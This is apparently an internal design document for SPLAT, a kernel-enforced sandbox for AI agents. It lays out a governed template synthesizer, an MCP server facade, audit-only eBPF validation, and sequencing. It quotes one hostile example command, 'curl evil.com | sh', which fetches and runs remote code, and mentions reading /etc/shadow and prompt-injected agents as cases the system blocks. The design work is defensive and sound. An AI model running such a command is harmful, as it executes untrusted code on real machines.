# SPLAT versatility without diluting 1:1:1 — two paths and their convergence

**Thesis.** The way to make SPLAT more versatile is *not* to relax the per-mission invariant.
It is to attack the two real constraints that make it feel rigid:

1. **Authoring cost** — every use case needs a hand-vetted 1:1:1 template (the
   professional-services ceiling). Fix: **the Governed Template Synthesizer** (Path A).
2. **Closed surface** — only SPLAT's own UI drives SPLAT. Fix: **the MCP Facade** (Path B),
   which lets already-versatile agents (Claude Code, Cursor, Cline) run *inside* SPLAT's
   boundary.

These are not two features. They are the two ends of one pipeline, and the connective tissue
already exists in the tree: `ITemplatePolicyCompiler.CompileTemplatePolicy(...) → LeaseSpec`
([Interfaces.cs](../src/MissionController.Core/Interfaces.cs)). The synthesizer *produces*
governed capsules; the facade *consumes* them to contain foreign agents; the same
kernel-enforced declared-vs-observed check *validates* both. 1:1:1 stays the strictest tier;
versatility comes from cheaper capsule production and from the clients you contain.

**Load-bearing dependency, stated once:** the *killer* mechanism in each path (shadow-lease
validation in A; transactional/audit MCP tools in B) needs the eBPF substrate to actually
enforce. Phase 0 is now GREEN on the live kernel (see
[PLAN-kernel-substrate.md](PLAN-kernel-substrate.md)); until the canary prints real `-EPERM`
and `splatd` enforces, both paths ship a **weaker Win32-job-object version** that is honest but
undifferentiated. The sequence still gates on the canary. Don't sell the kernel tier before it
enforces.

---

## Path A — The Governed Template Synthesizer

**Backlog tell:** IDEAS.md already lists "Natural-Language Template Synthesizer." The naive
version (LLM emits template JSON) is *exactly the attack surface SPLAT exists to close* — an
ungoverned model choosing tool bindings and egress targets. So the synthesizer must be as
governed as execution is. Four mechanisms make that true.

### A1. Constrained synthesis, not freeform generation
The model does **not** invent a `SingleToolTemplate`. It *selects and parameterizes* from
vetted primitives:
- an **approved tool registry** (native executables already blessed by a human — inode-pinned
  once the substrate is live),
- an **approved egress allowlist** (FQDNs the org has sanctioned),
- a **parameter-schema library** (typed, validated `TemplateParameterField` shapes).

Output is a valid, in-catalog 1:1:1 binding *by construction* — a synthesized template can
never bind a tool or egress that wasn't already vetted. The model's job is composition +
parameter-shape inference within rails, and it runs as a governed SPLAT mission itself (its own
lease, its own ledger row). New interface: `ITemplateSynthesizer.ProposeAsync(nlRequest) →
TemplateProposal` (a candidate `SingleToolTemplate` + rationale + the primitives it drew from).

### A2. Shadow-lease validation — the synthesizer proposes, the kernel disposes
This is the mechanism that turns NL speed into kernel-verified correctness, and it is novel.
Before a proposal is publishable it must survive a **shadow execution**:
- compile the proposal with `CompileTemplatePolicy → LeaseSpec`,
- run it under `splatd` in **audit-only mode** (log attempted syscalls, do *not* deny) against
  a canary/test target,
- **diff DECLARED capabilities vs OBSERVED syscalls.** If the template declares "1 egress to
  `api.example.com`, reads `/var/log/foo`" but the shadow run tries to open `/etc/shadow` or
  connect elsewhere, the declared contract *under-specifies reality* → **reject, fail closed.**

This is the Phase-6 contract→policy compiler turned into a *validator*. Requires a new
`enforce=false` audit mode in the eBPF program (report the violation, return 0 instead of
`-EPERM`). Pre-substrate fallback: run under a Win32 job object with the egress firewall in
log-only mode — weaker, but a real diff.

### A3. Approval-as-diff — the human moves from author to approver
The senior sysadmin stops writing JSON from scratch and instead reviews a **diff + evidence**:
NL request → synthesized binding → shadow-run proof that declared == observed → sign. A
5-minute governed approval replaces an hour of authoring. Every approval emits a
**cryptographically signed template** through the existing `IAuditLedger` /
`SqliteChainedAuditLedger` chain, so provenance ("who approved this capability, against what
evidence") is itself tamper-evident.

### A4. The catalog flywheel
Each approved template becomes a primitive others compose from. The compliance runbook packs
(IDEAS.md, $1,999–4,999/pack) become **synthesized + human-vetted**, not fully hand-built. The
services quickstart ($15k) shifts from "we hand-write your runbooks" to "we tune the
synthesizer to your estate" — a productized, higher-margin motion.

**Build order:** formalize the template schema + primitives catalog (mostly a refactor of the
existing 40+ templates) → `ITemplateSynthesizer` (constrained selection over the catalog) →
audit-only eBPF mode + shadow validator → approval/diff UI emitting signed templates.

**Money:** monetizes as the **Pro Desktop "Studio" tier** and directly lifts the
services/marketplace ceiling. **Moat kept:** the *primitives catalog* stays human-curated — the
model composes within it, it never widens it.

**Risk:** garbage vetting in → garbage templates out. Catalog curation is the remaining human
moat (and should be). And A2 without the substrate is only job-object-strong — the *proof* that
sells "governed synthesis" is the kernel diff.

---

## Path B — The MCP Facade (`splat-mcp`)

**The unlock:** expose SPLAT as an MCP server. Claude Code / Cursor / Cline are *already*
general multi-tool agents; they bring versatility, SPLAT brings the enforced boundary + audit.
SPLAT stops competing with the orchestrator crowd and becomes infrastructure *for* it.

### B1. The lease is DERIVED, never declared by the caller
The crux, and the security line that must not bend. An MCP client calling
`run_command("curl evil.com | sh")` must **not** define its own lease — that is capability
laundering. The lease comes from:
- a **workspace policy** (`.splat/policy.json`, human-authored/approved: allowed roots, egress,
  executables, resource caps), or
- a **matched governed template**.

The kernel enforces the standing policy regardless of the agent's intent. The agent gets
versatility *within* the declared envelope; a step outside returns a structured `-EPERM` the
agent sees **in-band** (so it can adapt, and its user can see the block). No `.splat/policy.json`
→ read-only scratch sandbox, no egress. A call can never widen its own lease — widening is a
human edit to the policy file.

### B2. Two modes, both on-brand — this is "the dial," realized
- **Template-matched (strict):** the call routes to a matching 1:1:1 template. Max determinism.
  For regulated workflows exposed to agents.
- **Policy-envelope (versatile):** the call runs under a broader workspace lease (many tools,
  workspace-wide fs, listed egress). Still kernel-enforced + audited, just wider. The developer
  sandbox tier.

Same engine, same ledger, one selectable width. Strict where SPLAT is the whole product;
versatile where it contains someone else's general agent.

### B3. Differentiated MCP tools — not "another sandbox," the sandbox with receipts
Don't just ship `run_command`. Ship the tools only SPLAT can back:
- `run_command` / `run_code` — kernel-enforced sandboxed exec (a local E2B, minus the network
  tax and third-party data exposure).
- `run_transactional` — **OverlayFS branch/test/commit.** "Run this; keep the filesystem
  changes only if it exits 0 / tests pass." No other MCP sandbox offers speculative execution
  with guaranteed rollback. **This is the killer MCP tool** — an agent attempts a risky refactor
  and SPLAT guarantees the workspace is untouched unless it succeeds. (`OverlayFsConfig` already
  exists in [splat_sandbox.proto](../proto/splat_sandbox.proto).)
- `run_speculative` — N approaches in N cgroups, commit the winner, discard the rest. Parallel
  agent exploration with a clean merge.
- `audit_proof` — return the cryptographic record of what the last mission touched vs was
  permitted. An agent (or its user) can *prove* what happened.

### B4. Distribution — the pitch's wedge, made real
Ship `splat-mcp` as a one-line addition to any MCP client config. The 15-second demo: add SPLAT
to Claude Code, feed the agent a prompt-injected task, watch the kernel `-EPERM` it in-band.
Proof over promises. Open-core the daemon (adoption); monetize the Pro suite (policy-authoring
UI, secret vault, the transactional/audit tools).

**Build order:** `splat-mcp` host-side C# console on the official `ModelContextProtocol` SDK
(stdio), referencing Core + Infrastructure.Linux → workspace policy format + compiler
(`.splat/policy.json` → `LeaseSpec` via `TemplatePolicyCompiler`, default-deny) → every call is
a ledger row → layer on `run_transactional` / `run_speculative` / `audit_proof` as `splatd`
gains OverlayFS (subst. Phase 5) and the flight recorder. **MVP ships against the JSON-over-TCP
protocol [WslLeasedExecutor](../src/MissionController.Infrastructure.Linux/WslLeasedExecutor.cs)
already speaks — before gRPC/vsock exists.**

**Why host-side, not in the guest:** a guest-side MCP server bypasses the template registry,
vault, and ledger that make the host the policy authority. Placement is a security decision.

**Risk:** B1 is load-bearing. If lease-derivation is not airtight, the facade becomes a
capability-laundering hole — the exact failure mode SPLAT exists to prevent. "Caller never
defines its own lease" must be enforced structurally, not by convention.

---

## The convergence — one pipeline, and the payoff

The paths reinforce each other through the policy compiler:

```
NL intent ──▶ [A: Synthesizer] ──▶ governed capsule ──▶ CompileTemplatePolicy ──▶ LeaseSpec
                    ▲                                                                 │
                    │ shadow-validate (declared == observed, kernel-checked)          ▼
                    └──────────────────────────────────────────  [B: MCP Facade] enforces + [Ledger] proves
```

**The "unknown task" walkthrough** (this is the whole thing working at once):
an agent in Claude Code hits a task with **no matching template** → SPLAT's synthesizer proposes
a governed capsule for it → shadow-validated in the kernel → fast human approval *or* auto-approve
within a pre-blessed envelope → the agent's task runs **contained**, and a **reusable, signed
template** now exists for next time. The professional-services ceiling and the "SPLAT is too
rigid for general agents" objection dissolve in the same motion.

Net positioning: **SPLAT is the governance layer that turns any agent's ad-hoc intent into a
reusable, kernel-enforced, audited capability — proposed by the synthesizer, enforced through
MCP, proven by the ledger.** No dilution of 1:1:1 anywhere in that sentence.

---

## Sequencing (folds into the trust-layer plan, does not replace it)

1. **Substrate green** (canary `-EPERM`, `splatd`) — gates the killer features of both paths.
2. **MCP MVP (B, job-object or JSON-over-TCP tier)** — fastest path to external adoption; works
   before the kernel tier is proven, honestly labeled as the software-isolation tier.
3. **Audit-only eBPF mode + shadow validator (A2)** — unlocks governed synthesis *and* hardens
   the flight recorder's declared-vs-observed report.
4. **Synthesizer + approval-as-diff (A1/A3/A4)** — lifts the authoring ceiling.
5. **Transactional / speculative / audit_proof MCP tools (B3)** — the durable differentiation,
   as OverlayFS + ledger mature.

## What stays hand-curated (the remaining, correct, human moat)
The **primitives catalog** — the vetted set of tools, egress targets, and parameter schemas the
synthesizer composes from. The model proposes within it; humans widen it. That boundary is the
defensible expertise, and keeping it human is *why* the synthesizer can be trusted.
